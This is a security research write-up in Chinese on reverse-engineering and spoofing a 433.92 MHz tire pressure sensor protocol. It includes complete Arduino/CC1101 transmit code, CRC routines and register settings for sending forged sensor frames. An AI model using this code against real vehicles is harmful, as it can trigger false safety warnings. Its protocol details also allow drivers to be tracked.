***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![](https://image.3001.net/images/20181226/1545798312_5c2302a81971b.png!small)

## 胎压无线传感器安全检测

**我们团队之前也有用USRP和GNUradio对其他的胎压设备进行的安全检测，我不使用这套环境的原因是软件无线电的设备和笔记本已经算体积不小的一套设备，通常测试环境都在户外，在这种环境下对这个胎压系统做安全检测实在不方便，并且一套无线电设备也不是一般入门小白能消费的起的，所以这也是为什么我想打造一套低成本便携性无线电攻防设备的原因。**

## 发现信号

首先我们要观察这个设备的工作频点，通常这类的胎压设备都工作在`433.92Mhz`这个频点上，传感器会在安装和卸下时候发送无线数据，否者就要等待数分钟传感器才会再次发送胎压数据，因为低功耗的原因考虑。

![](https://image.3001.net/images/20181226/1545798317_5c2302ad62ffe.png!small)

然后我们可以通过观察频谱`(Fosphor)`方式得到该信号工作在`433.92Mhz`上，调制方式为`2-FSK`，两个主瓣之间的频率偏差`20.5Khz(Deviation)`，然后我们通过软件无线电的方式将胎压的原始信号接收下来进行分析。

## 胎压传感器信号调制

![](https://image.3001.net/images/20181226/1545798322_5c2302b20f844.png!small)

![](https://image.3001.net/images/20181226/1545798326_5c2302b6d0599.png!small)

然后这个就是我通过软件无线电的方式采样到的原始信号导入到`dspectrum`的频谱图，然后我们通过这一幅频谱图来讲讲`2FSK`调制方式：

![](https://image.3001.net/images/20181226/1545798332_5c2302bc84f58.png!small)

`2FSK`调制方式简单来说就是两种频率来表示 `Bit 0`，`Bit 1`，如图所示假如我们要发射`11100101`，这段数据在要发送`Bit
1`数据时候频率切换成了载波频率`F1`，要发送`Bit
0`数据时候切换到载波频率`F2`，最后的调制输出就是我们用软件无线电接收到的结果了，然后我们可以通过这种方式将`信号数据解调`下来了进行分析了。

![](https://image.3001.net/images/20181226/1545798337_5c2302c12e70a.png!small)

这个就是整一段胎压传感器发射出来的信号了，前面是前导码用于唤醒接收端使用的，前导码后面一个特别长的脉冲信号是同步引导码用于发射端和接收端同步时钟使用的，后面就是胎压的`有效数据`了，我们可以对这个有效数据进行分析了。

## 胎压传感器协议数据逆向

![](https://image.3001.net/images/20181226/1545798343_5c2302c703d50.png!small)

我们先得到胎压的数据`NRZ`速率为`9.08k`，数据如果采用`曼彻斯特`或者`类似编码`的话速率要除于2，得到速率为`4.5K`。

![](https://image.3001.net/images/20181226/1545798348_5c2302cce00c7.png!small)

最开始分析信号时候以为数据是通过`曼彻斯特`进行编码的，发现用曼彻斯特方式怎么解码都不对，后来分析很久之后查了一下芯片的`datasheet`才发现是`自有编码协议`，这个就是传感器的`编码规则`，下一个Bit的波形是会根据上一个Bit波形结尾的电平来决定的，知道编码规则后通过这个我们对数据进行进行解码，以一个字节的信号的波形举例吧，从开头的`Bit
0`开始讲吧，可以看到前面的脉冲是`高电平`波形，这时候如果要发送`Bit0`的数据就需要输出`NRZ"01"`，如果之前是`低电平`的话则输出`NRZ"10"`，如果是要输出`Bit1`同理，上一个波形结尾为`高电平`输出`NRZ"00"`，如果是`低电平`的话输出`NRZ"11`，就可以通过这种方式得到一个字节的数据，二进制`01011100`，然后转成`十六进制`，这一段的波形就表示`0x5C`的数据内容了：

![](https://image.3001.net/images/20181226/1545798356_5c2302d489543.png!small)

通过多次对多台胎压监测设备以及多个传感器器的信号进行行行采样、逆向分析得到其信号的数据结构为：

ID识别码 (4 Byte)+ 电压 (1 Byte) + 压感 (1 Byte)+ 温度 (1 Byte) + 气阀 (1 Byte) + CRC (2
Byte)+停止码(1.5Bit)

    
    
    0x20， 0x95， 0x91， 0x85 //ID(识别码)
    
    0xA0， //电压
    
    0x42， //压力 显示数值乘于3.2，如果要显示胎压2.0 需要传输，20*3.2=64(0x40)
    
    0x63， //温度 显示数据加上0x37，如果要显示44°C 需要传输44+55(0x37)=99(0x63)
    
    0x08， //气阀(漏气检测)
    
    0x00，0x00 //CRC16 校验码

首先我们来说一下这里的参数，`ID`是每个传感器的`序列号`类似的标识符，一套胎压系统配备四个传感器所以出厂时候会绑定`四个ID`，然后就是`气压`，`温度`，`气阀(漏气检测)`的数据，通常低于或高于设置的数值就会进行`报警`，每家胎压设置的`阈值`都不一样我们就不过多的说了.然后就是数据中`CRC校验`.将所有发射的数据进行`CRC16`得出两个字节的校验数据附加到数据结尾。

需要注意是这里采用的CRC16的校验方式，并且`CRC16`有多套标准，经过重复的分析得出使用是`CRC16_CCITT`这套的标准，最后的停止码没有任何意义就是代表数据已经发射完了。

## 使用HackCube-Special伪造胎压传感器数据

    
    
    byte  TPMS_data[11] = {
    
        0x20， 0x95， 0x91， 0x85， 0xA0， 20 * 3.2， 44 + 0x37， 0x00
    
    };
    
    //20 95 91 85 A0 40 63 00 52 8C 
    

假如说要发射出TPMS_data其中的数据，最后会发射出来的就是`20959185A0406300528C`这串数据，数据的结尾`528C`就是算出来的`CRC`

    
    
    //要发射的胎压数据
    
    byte  Transmit_data[11] = { 
    
        0x20， 0x95， 0x91， 0x85， 0xA0， 20 * 3.2， 44 + 0x37， 0x00
    
    }; 
    
    uint16_t crc_out = calc_crc(Transmit_data， 8， 0xffff); 
    
    //然后根据这8个字节的有效数据算出2个字节的CRC校验码
    
    uint16_t calc_crc(byte * msg， int n， uint16_t init){
    
      uint16_t x = init;
    
      while (n--){
    
        x = crc_xmodem_update(x， (uint16_t) * msg++);
    
      }
    
      return (x);
    
    }
    
    uint16_t crc_xmodem_update (uint16_t crc， uint8_t data){
    
      int i;
    
      crc = crc ^ ((uint16_t)data << 8);
    
      for (i = 0; i < 8; i++){
    
        if (crc & 0x8000)
    
          crc = (crc << 1) ^ 0x1021; //(polynomial = 0x1021)
    
        else
    
          crc <<= 1;
    
      }
    
      return crc;
    
    }
    

这个就是算出结尾两个字节校验码的代码，接收端会先判断这两个字节的校验码，如果是不对，接收端是不会去响应的。

## 发射胎压传感器射频数据

![](https://image.3001.net/images/20181226/1545798414_5c23030ea3f44.png!small)

![](https://image.3001.net/images/20181226/1545798421_5c23031510630.png!small)

之后我们就可以根据这个去发射伪造传感器的数据了，这里我使用的TI的`CC1101`
射频芯片，我们通过`Atmega32u4`通过`SPI(MOSI，MISO，SCK，CS)`配置射频芯片`CC1101`的相关射频寄存器，然后通过`CC1101`的`GDO0`引脚将射频数据发出，也可以采用数据包模式将数据发射出来，但是因为数据包模式不方便兼容其他的类型的胎压设备。

## CC1101射频参数配置

    
    
    #define CC1101_TPMS_IOCFG2          0x29
    
    #define CC1101_TPMS_IOCFG1          0x2E
    
    #define CC1101_TPMS_IOCFG0          0x06
    
    #define CC1101_TPMS_FIFOTHR          0x47
    
    #define CC1101_TPMS_SYNC1            0xD3
    
    #define CC1101_TPMS_SYNC0            0x91
    
    #define CC1101_TPMS_PKTLEN          0x05
    
    #define CC1101_TPMS_PKTCTRL1        0x04
    
    #define CC1101_TPMS_PKTCTRL0        0x30
    
    #define CC1101_TPMS_ADDR            0x00
    
    #define CC1101_TPMS_CHANNR          0x00
    
    #define CC1101_TPMS_FSCTRL1          0x06
    
    #define CC1101_TPMS_FSCTRL0          0x00
    
    #define CC1101_TPMS_MDMCFG4          0xF8
    
    #define CC1101_TPMS_MDMCFG3          0x9B
    
    #define CC1101_TPMS_MDMCFG2          0x33
    
    #define CC1101_TPMS_MDMCFG1          0x22
    
    #define CC1101_TPMS_MDMCFG0          0xF8
    
    #define CC1101_TPMS_DEVIATN          0x00
    
    #define CC1101_TPMS_MCSM2            0x07
    
    #define CC1101_TPMS_MCSM1            0x30
    
    #define CC1101_TPMS_MCSM0            0x18
    
    #define CC1101_TPMS_FOCCFG          0x16
    
    #define CC1101_TPMS_BSCFG            0x6C
    
    #define CC1101_TPMS_AGCCTRL2        0x03
    
    #define CC1101_TPMS_AGCCTRL1        0x40
    
    #define CC1101_TPMS_AGCCTRL0        0x91
    
    #define CC1101_TPMS_WOREVT1          0x87
    
    #define CC1101_TPMS_WOREVT0          0x6B
    
    #define CC1101_TPMS_WORCTRL          0xFB
    
    #define CC1101_TPMS_FREND1          0x56
    
    #define CC1101_TPMS_FREND0          0x11
    
    #define CC1101_TPMS_FSCAL3          0xE9
    
    #define CC1101_TPMS_FSCAL2          0x2A
    
    #define CC1101_TPMS_FSCAL1          0x00
    
    #define CC1101_TPMS_FSCAL0          0x1F
    
    #define CC1101_TPMS_RCCTRL1          0x41
    
    #define CC1101_TPMS_RCCTRL0          0x00
    
    #define CC1101_TPMS_FSTEST          0x59
    
    #define CC1101_TPMS_PTEST            0x7F
    
    #define CC1101_TPMS_AGCTEST          0x3F
    
    #define CC1101_TPMS_TEST2            0x81
    
    #define CC1101_TPMS_TEST1            0x35
    
    #define CC1101_TPMS_TEST0            0x0B
    

![](https://image.3001.net/images/20181226/1545798433_5c230321a235a.png!small)

这个是根据胎压传感器信号生成的`CC1101`寄存器的配置，可以通过`SmartRF
Studio`配置完参数后导出，不过有些寄存器是不支持IDE去进行`设置`的，必须是根据芯片的`datasheet`去修改的，比如说让射频芯片处于`异步模式`，切换射频芯片的`工作状态`等等。

    
    
    void setfreq(unsigned long int freq) { //参考datasheet写的一个设置工作射频频率的函数，可以使用SmartRF Studio计算得出
    
      unsigned long freqnum = freq / 396.734569;
    
      byte freqx[3];
    
      freqx[0] = freqnum;
    
      freqx[1] = freqnum >> 8;
    
      freqx[2] = freqnum >> 16;
    
      cc1101.writeReg(CC1101_FREQ2， freqx[2]);
    
      cc1101.writeReg(CC1101_FREQ1， freqx[1]);
    
      cc1101.writeReg(CC1101_FREQ0， freqx[0]);
    
    }
    
    void CC1101_config() {
    
      cc1101.SS_PIN = A3;//选择CC1101射频模块连接主控端的片选引脚
    
      cc1101.init();//初始化CC1101并对射频芯片进行寄存器配置
    
      setfreq(433925000);//配置射频芯片工作频率(刚刚通过频谱仪得到的频点信息)
    
      const byte paTable[8] = {0x00， 0xc0， 0x00， 0x00， 0x00， 0x00， 0x00， 0x00};
    
      cc1101.writeBurstReg(CC1101_PATABLE， (byte*)paTable， 8);//配置射频芯片射频功率(设置参考datasheet，SmartRF Studio)
    
      cc1101.writeReg(CC1101_MCSM0， 0x08);//配置射频芯片XOSC校准(参考datasheet)
    
      cc1101.writeReg(CC1101_MDMCFG2， 0x03); //将射频芯片芯片调制模式设置为FSK
    
      cc1101.writeReg(CC1101_DEVIATN， 0x35); //设置2FSK两个主瓣的频差
    
      cc1101.writeReg(CC1101_IOCFG0， 0x0d); //设置异步模式
    
    }
    

在`cc1101.init()`函数中将刚刚的射频配置写入CC1101的相关寄存器中，然后我们挑几个关键的讲讲，`setfreq`函数用于将CC1101设置在胎压的`工作频率`上，`MDMCFG2`设置芯片的调制模式为`2FSK`，我们这里使用的芯片的异步模式，就是通过`引脚`去将数据发射出来，不是通过`SPI`方式将要发射的数据写入到芯片的发射缓存区中。

## 射频信号发射

    
    
    //          id            电压  压力  温度  漏气
    
      //0xF0， 0xFB， 0x23， 0x85， 0xA0， 0x42， 0x60， 0x08
    
    byte  left_back[8] = { //待伪造其中一个轮胎的传感器数据
    
        0xF0， 0xFB， 0x23， 0x85， 0xA0， 21 * 3.2， 22+ 0x37， 0x00
    
      }; 
    
    Attack_TPMS(left_back); //发射函数
    
    void Attack_TPMS(byte * Tansmit_data) {//发射调用的函数
    
      cc1101.cmdStrobe(CC1101_STX);//将射频芯片配置为发射状态
    
      delayMicroseconds(802);//因为射频芯片进入TX状态后需要校准时钟所需延迟802Us
    
      Transmit_TPMS(Tansmit_data);//发射数据处理函数
    
      cc1101.cmdStrobe(CC1101_SIDLE);//将芯片状态从TX转入IDLE空闲状态，否则芯片会一直发射2FSK信号
    
      delay(65);//两个信号间隔的安全时间
    
      //.... 函数内的在执行一遍
    
    }
    

left_back这个数组里面存着的就是待发射的数据，CRC通过Transmit_TPMS自动算出来附加到数组结尾。我们接下来看看Transmit_TPMS发射数据操作函数。

    
    
    void Transmit_TPMS(byte * Transmit_data) {
    
      int len = 8;
    
      lastbit = true;//根据上一个Bit的电平变化来决定下一个Bit的波形
    
      uint16_t crc_out = calc_crc(Transmit_data， len， 0xffff); //算出发射数组中的CRC值
    
      int msb = (crc_out & 0xff00) >> 8;
    
      int lsb = (crc_out & 0x00ff) ;
    
      Transmit_data[8] = lsb;
    
      Transmit_data[9] = msb;//协议中两个字节的CRC数据
    
      len += 2;
    
      Sync_1();//发射前导码和同步值
    
      for (int i = 0; i < len; i++) {
    
        Transmit_byte_1(Transmit_data[i]);//根据数组大小发射数组中的数据，操作底层硬件io
    
      }
    
      digitalWrite(pin， HIGH);
    
      delayMicroseconds(bit_delay_1 * 3);
    
      digitalWrite(pin， LOW);//信号结尾端
    
    }
    

然后这个是发射数据操作函数，算出CRC数据后根据Transmit_data的数据内容在GDO0这个引脚上输出对应的波形。

    
    
    #define bit_delay_1 111 //9.09k 速率 通过我们刚刚在分析出的信号速率得到的
    
    #define  pin 3// MCU 连接 CC1101 的GDO0 引脚(异步模式发射引脚)
    
    void Transmit_bit0() {//发射Bit0的波形
    
      if (lastbit) {//根据(lastbit)上一个bit的波形电平来产生出下个一个信号的波形
    
        digitalWrite(pin， LOW); //通过控制 CC1101 的GDO0引脚来产生出对应的波形信号
    
        delayMicroseconds(bit_delay_1);//该波形的持续时延，波形参考编码规则
    
        digitalWrite(pin， HIGH); 
    
        delayMicroseconds(bit_delay_1);
    
        lastbit = true;
    
      } else {
    
        digitalWrite(pin， HIGH);
    
        delayMicroseconds(bit_delay_1);//该波形的持续时延，波形参考编码规则
    
        digitalWrite(pin， LOW);
    
        delayMicroseconds(bit_delay_1);
    
        lastbit = false;
    
      }
    
    }
    
    void Transmit_bit1() { //发射Bit1的波形
    
      if (lastbit) {//根据(lastbit)上一个bit的波形电平来产生出下个一个信号的波形
    
        digitalWrite(pin， LOW);
    
        delayMicroseconds(bit_delay_1 * 2); //该波形的持续时延，波形参考编码规则
    
        lastbit = false;
    
      } else {
    
        digitalWrite(pin， HIGH);
    
        delayMicroseconds(bit_delay_1 * 2); //该波形的持续时延，波形参考编码规则
    
        lastbit = true;
    
      }
    
    }
    
    void Transmit_byte_1(byte data) {//处理发射数据的函数
    
      for (int a = 0; a < 8; a++) { //位移Byte数据根据每个Bit 在io上产生出相应的规则
    
        if (data & 0x80) 
    
          Transmit_bit1(); 
    
        else
    
          Transmit_bit0();
    
        data = data << 1;
    
      }
    
    }
    

然后我通过这种方式就能够对这个传感器进行伪造攻击了：

![](https://image.3001.net/images/20181226/1545798450_5c23033256b37.png!small)

这个就是我们伪造出来的引脚波形：

![](https://image.3001.net/images/20181226/1545798455_5c2303370def9.png!small)

## 演示视频

## 总结一下存在的安全风险

因为胎压数据没有经过任何的`加密`的操作，完全是明文传输仅仅只有`CRC`进行校验，只要知道其中使用的编码规则或者协议数据就可以很简单的对这个胎压传感器进行伪造攻击!并且其中传感器id是`明文传输`的，只要在一个城市中部署足够多的嗅探节点可以对安装了胎压的汽车进行`轨迹分析`，从而分析出每个车主的生活轨迹。

目前只是对2FSK的胎压信号进行伪造并发射，并没有对2FSK进行解调解码的操作，后面有时间的话会对这一块进行升级吧，增加嗅探解码的功能。

然后在我们的HackCube-Special 上已经封装好了这个伪造胎压传感器的功能，各位对这块感兴趣的小伙伴可以看下我们HackCube-Special有任何问题的欢迎在我们的[社区](https://unicorn.360.com/HackCube)上交流。

我们的硬件产品预计会在12月份年底左右上线，在我们社区上提交质量不错的文章是有机会拿到第一时间产品的哟~

## 参考链接

<http://ingelect.esy.es/pdf/FXTH871x7.pdf>

<http://www.ti.com/lit/ds/symlink/cc1101.pdf>

 ***本文作者：mobier，转载请注明来自FreeBuf.COM**

